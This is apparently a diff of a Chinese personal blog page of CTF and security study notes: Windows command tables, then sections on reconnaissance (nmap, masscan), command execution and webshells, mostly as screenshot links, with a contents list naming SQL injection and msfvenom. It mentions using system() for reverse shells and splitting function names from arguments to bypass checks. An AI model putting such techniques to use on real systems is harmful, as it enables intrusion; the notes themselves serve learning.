+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>del</code></strong> / <strong><code>rm</code></strong></td>
+          <td style="text-align: left">删除文件</td>
+          <td style="text-align: left"><code>del test.txt</code> <code>del *.log</code> (删除当前目录下所有<code>.log</code>文件) <strong>注意</strong>: 此操作通常<strong>不可逆</strong>，不经过回收站</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>copy</code></strong> / <strong><code>cp</code></strong></td>
+          <td style="text-align: left">复制文件</td>
+          <td style="text-align: left"><code>copy source.txt D:\backup\</code> (复制到备份目录) <code>cp data.csv E:\data\</code> (PowerShell语法)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>xcopy</code></strong></td>
+          <td style="text-align: left">复制目录及其子文件（功能更强）</td>
+          <td style="text-align: left"><code>xcopy D:\project C:\backup\ /s /e</code> (递归复制整个项目目录)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>move</code></strong> / <strong><code>mv</code></strong></td>
+          <td style="text-align: left">移动文件/文件夹，或重命名</td>
+          <td style="text-align: left"><code>move file.txt D:\new-location\</code> (移动) <code>mv old.txt new.txt</code> (重命名)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>ren</code></strong></td>
+          <td style="text-align: left">重命名文件/文件夹</td>
+          <td style="text-align: left"><code>ren report.docx report_final.docx</code></td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">指令</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">用法举例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong><code>ping</code></strong></td>
+          <td style="text-align: left">测试网络连通性与延迟</td>
+          <td style="text-align: left"><code>ping www.baidu.com</code> (测试能否上网) <code>ping -t 192.168.1.1</code> (持续测试，按 <code>Ctrl+C</code> 停止)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>ipconfig</code></strong></td>
+          <td style="text-align: left">查看IP地址、网关等网络配置</td>
+          <td style="text-align: left"><code>ipconfig</code> (简要信息) <code>ipconfig /all</code> (查看详细的物理地址和DNS) <code>ipconfig /flushdns</code> (刷新DNS缓存，解决网页打不开问题)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>tracert</code></strong></td>
+          <td style="text-align: left">路由追踪，定位网络拥堵或故障点</td>
+          <td style="text-align: left"><code>tracert www.google.com</code> (显示数据包经过的每一跳路由)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>netstat</code></strong></td>
+          <td style="text-align: left">查看端口占用和网络连接状态</td>
+          <td style="text-align: left"><code>netstat -ano</code> (查看所有连接及对应进程PID，常用于查端口占用)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>nslookup</code></strong></td>
+          <td style="text-align: left">查询域名对应的IP地址 (DNS解析)</td>
+          <td style="text-align: left"><code>nslookup github.com</code></td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407125947516.png" alt="image-20260407125947516"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407130818935.png" alt="image-20260407130818935"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407130927271.png" alt="image-20260407130927271"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407132624669.png" alt="image-20260407132624669"></p>
+<p>massscan   nmap</p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407133728493.png" alt="image-20260407133728493"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407213736342.png" alt="image-20260407213736342"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407214119424.png" alt="image-20260407214119424"></p>
+<h1 id="webshell和命令执行">
+<a class="header-anchor" href="#webshell%e5%92%8c%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c"></a>
+webshell和命令执行
+</h1><p><strong>命令执行</strong>指Web应用直接把用户输入的内容，当成了系统命令去执行</p>
+<p><strong>Webshell</strong> = 你在目标电脑上成功安装了一个“远程桌面”或“TeamViewer”，可以随时连上去，有个图形界面，随便操作</p>
+<h4 id="命令执行">
+<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c"></a>
+命令执行:
+</h4><p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407220251134.png" alt="image-20260407220251134"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260407220730973.png" alt="image-20260407220730973"></p>
+<p><strong>把「函数名」和「参数」分开传，从而绕过一些安全检查，最终还是执行恶意代码。</strong></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408210437530.png" alt="image-20260408210437530"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408210445955.png" alt="image-20260408210445955"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408210751012.png" alt="image-20260408210751012"></p>
+<table>
+  <thead>
+      <tr>
+          <th><code>system()</code></th>
+          <th><strong>操作系统命令</strong></th>
+          <th>反弹 shell、读文件、删文件</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408211120959.png" alt="image-20260408211120959"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408211439091.png" alt="image-20260408211439091"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212031438.png" alt="image-20260408212031438"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212253560.png" alt="image-20260408212253560"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212443473.png" alt="image-20260408212443473"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212507829.png" alt="image-20260408212507829"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212541811.png" alt="image-20260408212541811"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408212744682.png" alt="image-20260408212744682"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260408213050415.png" alt="image-20260408213050415"></p>
+<h1 id="webshell">
+<a class="header-anchor" href="#webshell"></a>
+webshell
+</h1><p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260409185750030.png" alt="image-20260409185750030"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260409185836592.png" alt="image-20260409185836592"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410083344036.png" alt="image-20260410083344036"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410083437364.png" alt="image-20260410083437364"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410084031816.png" alt="image-20260410084031816"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410092736462.png" alt="image-20260410092736462"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410093459685.png" alt="image-20260410093459685"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410093518467.png" alt="image-20260410093518467"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410094751411.png" alt="image-20260410094751411"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410101611820.png" alt="image-20260410101611820"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410102056641.png" alt="image-20260410102056641"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410102305913.png" alt="image-20260410102305913"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410102333723.png" alt="image-20260410102333723"></p>
+<h1 id="misc">
+<a class="header-anchor" href="#misc"></a>
+misc
+</h1><p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260410213010961.png" alt="image-20260410213010961"></p>
 </div>
     <footer class="article-footer"><div class="share-wrapper"></div><ul class="article-category-list"></ul>
 <ul class="article-tag-list" itemprop="keywords"></ul>
@@ -405,10 +1707,10 @@ AI写代码
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;220</span
+          >&nbsp;1.7k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;00:03</span>
+        <span class="icon-coffee">&nbsp;00:10</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -434,10 +1736,92 @@ AI写代码
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
+    <li><a href="#kali-linux虚拟机需要iso镜像文件因为需要个性化配置自动创建了一个vmdk空白磁盘文件然后通过iso配置">kali linux虚拟机需要iso镜像文件，因为需要个性化配置，自动创建了一个vmdk空白磁盘文件，然后通过iso配置</a></li>
+    <li><a href="#但是靶机不需要可视化图像因此不需要iso镜像文件只需要更换磁盘文件即可直接把别人修改好的vmdk文件拿来用">但是靶机不需要可视化图像因此不需要iso镜像文件，只需要更换磁盘文件即可，直接把别人修改好的vmdk文件拿来用</a></li>
+    <li><a href="#镜像就相当于克隆出了一个系统">镜像就相当于克隆出了一个系统</a></li>
+    <li><a href="#处理器cpu">处理器CPU</a></li>
+    <li><a href="#硬盘">硬盘</a></li>
+    <li><a href="#cddvdide">CD/DVD(IDE)</a></li>
+    <li><a href="#网络适配器">网络适配器</a></li>
+    <li><a href="#网卡">网卡</a></li>
+    <li><a href="#拖拽传文件">拖拽传文件</a></li>
+    <li><a href="#sql和数据库理解">SQL和数据库理解</a></li>
+    <li><a href="#算法">算法</a></li>
+    <li><a href="#第一部分基础数据结构你的工具箱">第一部分：基础数据结构——你的“工具箱”</a></li>
+    <li><a href="#第二部分核心算法策略你的兵法">第二部分：核心算法策略——你的“兵法”</a>
+      <ul>
+        <li><a href="#1-我需要在数据中查找什么">1. 我需要在数据中查找什么？</a></li>
+        <li><a href="#2-我需要把一堆东西安排得明明白白">2. 我需要把一堆东西安排得明明白白？</a></li>
+        <li><a href="#3-在资源有限的情况下如何达到最好或最省">3. 在资源有限的情况下，如何达到最好（或最省）？</a></li>
+        <li><a href="#4-数据挖掘与模式发现ai安全的交叉领域">4. 数据挖掘与模式发现（AI/安全的交叉领域）</a></li>
+      </ul>
+    </li>
+    <li><a href="#第三部分ctf网络安全领域的专项战略地图">第三部分：CTF/网络安全领域的“专项战略地图”</a></li>
+    <li><a href="#总结">总结：</a></li>
+    <li><a href="#处理phpstudy遇到的问题"><strong>处理phpstudy遇到的问题</strong></a>
+      <ul>
+        <li><a href="#第一步在公司电脑上开启-ftp-服务">第一步：在公司电脑上开启 FTP 服务</a></li>
+        <li><a href="#第二步你在家用-ftp-客户端连接">第二步：你在家用 FTP 客户端连接</a></li>
+      </ul>
+    </li>
+    <li><a href="#数据库">数据库</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#sql注入">SQL注入</a>
+      <ul>
+        <li><a href="#第一步信息收集">第一步：信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#2注入">2：注入</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#vscode代码视角">VScode/代码视角</a></li>
+    <li><a href="#源代码--编译汇编--机器码--加载到内存--cpu执行--结果写回">源代码 → 编译/汇编 → 机器码 → 加载到内存 → CPU执行 → 结果写回</a></li>
+    <li><a href="#https协议http">https协议/http</a></li>
+    <li><a href="#漏洞扫描">漏洞扫描</a></li>
+    <li><a href="#linux指令">Linux指令</a></li>
+    <li><a href="#ip">IP</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
     <li>
       <ul>
-        <li><a href="#http">http</a></li>
-        <li><a href="#post请求基本结构和get差不多">post请求基本结构和get差不多</a></li>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+        <li><a href="#-msfconsole主控台">📡 msfconsole：主控台</a></li>
+        <li><a href="#-msfvenom载荷生成器">🧬 msfvenom：载荷生成器</a></li>
+        <li><a href="#-主动攻击与被动攻击的一般流程">⚔️ 主动攻击与被动攻击的一般流程</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
       </ul>
     </li>
   </ul>
@@ -563,7 +1947,7 @@ AI写代码
           author: "Houchenhao",
           title: "htttp协议基础知识\u002bCTFHUB目前进度",
           url: "https:\/\/Houchenhao.github.io\/post\/1111\/",
-          description: "\rHTTP基础知识\rhttp\r当我们在浏览器 中输入网址并回车后，浏览器会向服务器发送一个 HTTP 请求。这个请求由多个部分组成，其中最重要的是请求行、头部和正文。\n一个完整的http例如：\nGET \/www.zip HTTP\/1.1 Host: challenge-bbb990ed1cd78ab4.sandbox.ctfhub.com:10800 User-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko\/20100101 Firefox\/150.0 Accept: …",
+          description: "\r大学ctf打了3年，安全厂商安服沉淀3年，目前小技术管理。个人建议，如果你是普通大学感觉有两个出路，第一个考个还不错的学校的研究生，出来技术一般就能进甲方比较稳定。 第二个也就是我选择的，专攻技术，大一大二可以专心学习ctf，web学习各种漏洞原理简单绕过，杂项可以学很多基础比如wireshark之类的，密码学可以了解各种加密算法，二进制逆向基础的题型也不难，借此了解汇编，数据结构，栈溢出之类的基础，总之ctf主要打牢基础。大三大四建议ctf\u002b大厂实习\u002b护网红队\u002bsrc，结合一些比较实战并且能丰富简历的项目。这样出来找工作还是比较轻松的，但是这几年大环境确实不好了，但是个人感觉安全比开发来说 …",
           cover: "https:\/\/Houchenhao.github.io\/images\/banner.jpg",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
